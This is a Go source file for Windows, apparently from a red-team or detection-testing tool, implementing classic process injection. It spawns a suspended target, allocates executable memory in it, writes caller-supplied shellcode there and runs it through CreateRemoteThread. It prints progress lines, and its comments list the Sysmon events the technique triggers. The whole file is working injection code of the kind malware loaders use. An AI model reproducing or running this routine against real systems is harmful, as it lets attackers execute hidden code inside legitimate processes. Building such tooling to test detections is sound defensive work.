//go:build windows

package technique

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// ClassicInject uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
//
// Detection fingerprint:
//   - Sysmon Event 10: OpenProcess from injector
//   - Sysmon Event 8: CreateRemoteThread into target (start address outside any PE)
//   - RWX VirtualAllocEx region in target VAD
func ClassicInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] VirtualAllocEx + WriteProcessMemory + CreateRemoteThread\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	pi, err := spawnProcess(target, true)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	addr, err := virtualAllocEx(pi.Process, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [alloc]     0x%x (RWX, %d bytes)\n", addr, len(shellcode))

	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, addr, &shellcode[0], uintptr(len(shellcode)), &written); err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	thread, tid, err := createRemoteThread(pi.Process, addr, 0)
	if err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer windows.CloseHandle(thread)
	fmt.Printf("  [thread]    TID %d at 0x%x\n", tid, addr)

	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d\n", pi.ProcessId)
	return nil
}
